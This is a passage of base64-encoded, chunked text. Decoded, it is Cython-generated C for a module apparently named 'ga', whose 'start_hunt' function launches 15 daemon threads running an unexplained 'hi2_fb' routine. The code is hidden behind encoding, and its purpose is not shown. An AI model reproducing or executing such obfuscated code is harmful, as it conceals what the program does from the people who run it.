1zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zbGVlcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCA5NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fcHl4X3RfNSA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8yMSkpKSB7CiAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMjEpOwogICAgICBhc3NlcnQoX19weXhfdF82KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzIxKTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMjEsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZmxvYXRfXzN9OwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIxLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4""X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDk2LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjApOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzI0KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzI3KTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImdhLmhpMl9mYiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfRSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0MpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9BKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfRyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0kpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9CKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfSik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0spOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9MKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfTSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X04pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9PKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfUCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X1EpOwogIF9fUHl4X1hERUNSRUYoX19weXhfZ2JfMmdhXzZoaTJfZmJfMmdlbmVyYXRvcik7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmdhXzVzdGFydF9odW50KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmdhXzVzdGFydF9odW50ID0geyJzdGFydF9odW50IiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJnYV81c3RhcnRfaHVudCwgTUVUSF9OT0FSR1Ms""IDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJnYV81c3RhcnRfaHVudChQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKSB7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzdGFydF9odW50ICh3cmFwcGVyKSIsIDApOwogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgX19weXhfciA9IF9fcHl4X3BmXzJnYV80c3RhcnRfaHVudChfX3B5eF9zZWxmKTsKCiAgCiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmdhXzRzdGFydF9odW50KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpIHsKICBQeU9iamVjdCAqX19weXhfdl9CID0gTlVMTDsKICBsb25nIF9fcHl4X3ZfQzsKICBQeU9iamVjdCAqX19weXhfdl9BID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBsb25nIF9fcHl4X3RfMjsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF84OwogIGludCBfX3B5eF90Xzk7CiAgUHlfc3NpemVfdCBfX3B5eF90XzEwOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInN0YXJ0X2h1bnQiLCAwKTsKCiAgCiAgX19weXhfdF8xID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTAwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX3B5eF92X0IgPSAoKFB5T2JqZWN0KilfX3B5eF90XzEpOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIGZvciAoX19weXhfdF8yID0gMDsgX19weXhfdF8yIDwgMTU7IF9fcHl4X3RfMis9MSkgewogICAgX19weXhfdl9DID0gX19weXhfdF8yOwoKICAgIAogICAgX19weXhfdF8zID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkaW5nKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5""eF90XzQpOwogICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMDIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGkyX2ZiKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF82ID0gX19QeXhfUHlMb25nX0Zyb21fbG9uZyhfX3B5eF92X0MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMDIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBfX3B5eF90XzcgPSBQeVR1cGxlX05ldygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzYpOwogICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oX19weXhfdF83LCAwLCBfX3B5eF90XzYpICE9ICgwKSkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDFfZXJyb3IpOwogICAgX19weXhfdF82ID0gMDsKICAgIF9fcHl4X3RfOCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgX19weXhfdF8zID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF84ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMiA6IDApXSA9IHtfX3B5eF90XzMsIE5VTEx9OwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMDIsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVf""Z2xvYmFsLT5fX3B5eF9uX3VfdGFyZ2V0LCBfX3B5eF90XzQsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMSwgMCkgPCAwKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MMV9lcnJvcikKICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXJncywgX19weXhfdF83LCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzEsIDEpIDwgMCkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDEtX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF82KTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICB9CiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X0EsIF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9BLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGFlbW9uLCBQeV9UcnVlKSA8IDApIF9fUFlYX0VSUigwLCAxMDMsIF9fcHl4X0wxX2Vycm9yKQoKICAgIAogICAgX19weXhfdF81ID0gX19weXhfdl9BOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzggPSAwOwogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0YXJ0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgxLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDQsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgX19weXhf""dF85ID0gX19QeXhfUHlMaXN0X0FwcGVuZChfX3B5eF92X0IsIF9fcHl4X3ZfQSk7IGlmICh1bmxpa2VseShfX3B5eF90XzkgPT0gKChpbnQpLTEpKSkgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDFfZXJyb3IpCgogICAgCiAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTA2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zbGVlcCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEwNiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19weXhfdF84ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzcpKSkgewogICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzcpOwogICAgICBhc3NlcnQoX19weXhfdF81KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzcpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF83LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzggPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2Zsb2F0X18xfTsKICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIH0KCiAgCiAgX19weXhfdF8xID0gX19weXhfdl9COyBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTsKICBfX3B5eF90XzEwID0gMDsKICBmb3IgKDs7""KSB7CiAgICB7CiAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEwNywgX19weXhfTDFfZXJyb3IpCiAgICAgICNlbmRpZgogICAgICBpZiAoX19weXhfdF8xMCA+PSBfX3B5eF90ZW1wKSBicmVhazsKICAgIH0KICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfMSwgX19weXhfdF8xMCk7CiAgICArK19fcHl4X3RfMTA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMDcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X0EsIF9fcHl4X3RfNyk7CiAgICBfX3B5eF90XzcgPSAwOwoKICAgIAogICAgX19weXhfdF81ID0gX19weXhfdl9BOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzggPSAwOwogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pvaW4sIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDEtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDEwOCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogICAgCiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImdhLnN0YXJ0X2h1bnQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0IpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9BKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5""eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7CiAgUHlPYmplY3QgKm87CiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpOwogIG8gPSBhbGxvY19mdW5jKHQsIDApOwogICNlbHNlCiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpKSkpIHsKICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl07CiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpOwogICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7CiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7CiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDsKICB9CiAgI2VuZGlmCiAgcmV0dXJuIG87Cn0KCnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcihQeU9iamVjdCAqbykgewogIHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilvOwogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgaWYgKHVubGlrZWx5KChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwIHx8IF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUobyksIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSkpICYmIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHsKICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikgewogICAgICBpZiAoUHlP""YmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47CiAgICB9CiAgfQogICNlbmRpZgogIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7CiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgUHlfQ0xFQVIocC0+X19weXhfdl9BKTsKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcikpKSkgewogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopbyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTsKICAgICNlbHNlCiAgICB7CiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7CiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pOwogICAgfQogICAgI2VuZGlmCiAgfQp9CgpzdGF0aWM